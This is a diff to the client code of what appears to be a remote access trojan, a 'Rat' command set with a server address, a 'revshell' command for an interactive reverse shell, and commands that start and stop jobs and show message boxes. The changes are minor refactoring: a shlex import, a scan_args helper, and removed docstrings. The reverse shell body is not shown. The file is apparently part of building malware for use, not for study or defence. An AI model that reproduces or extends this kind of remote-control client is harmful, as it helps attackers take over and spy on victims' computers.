@@ -4,6 +4,7 @@ import inspect
 import io
 import locale
 import os
+import shlex
 import socket
 import subprocess
 import sys
@@ -14,7 +15,7 @@ from client.commands.RatCmdHelp import RatCmdHelp
 from client.config.config import SERVER_ADDR, JOB_PATH
 from client.commands.CommandBase import CommandBase
 from client.util.decorator import desc
-from common.util import format_dict, logger, validate_required_args
+from common.util import format_dict, logger, validate_required_args, scan_args
 
 
 class CommonCommands(CommandBase):
@@ -142,6 +143,8 @@ class CommonCommands(CommandBase):
         self.socket.close()
         sys.exit(0)
 
+
+
     @desc('start a interactive reverse shell')
     def revshell(self, arg):
 
@@ -180,19 +183,6 @@ class CommonCommands(CommandBase):
 
     @desc('start a job in new thread')
     def start_job(self, job_name: str):
-        """
-        Start a job in a new thread. If no job name is provided, list all available jobs.
-
-        Args:
-            job_name: Name of the job to start (with or without .py extension)
-
-        Returns:
-            Tuple: (status_code, message) if listing jobs
-        Raises:
-            ValueError: For invalid operations
-            RuntimeError: For job execution issues
-        """
-
         job_name = job_name.strip()
 
         # List available jobs if no argument provided
@@ -238,15 +228,6 @@ class CommonCommands(CommandBase):
 
     @desc('stop a running job')
     def stop_job(self, job_name: str):
-        """
-        Stop a running job.
-
-        Args:
-            job_name: Name of the job to stop (with or without .py extension)
-
-        Returns:
-            Tuple: (status_code, message)
-        """
         job_name = job_name.strip()
 
         # List available jobs if no argument provided
@@ -334,3 +315,4 @@ class CommonCommands(CommandBase):
 
         except Exception as e:
             return 0, f"Failed to show message box: {str(e)}"
+
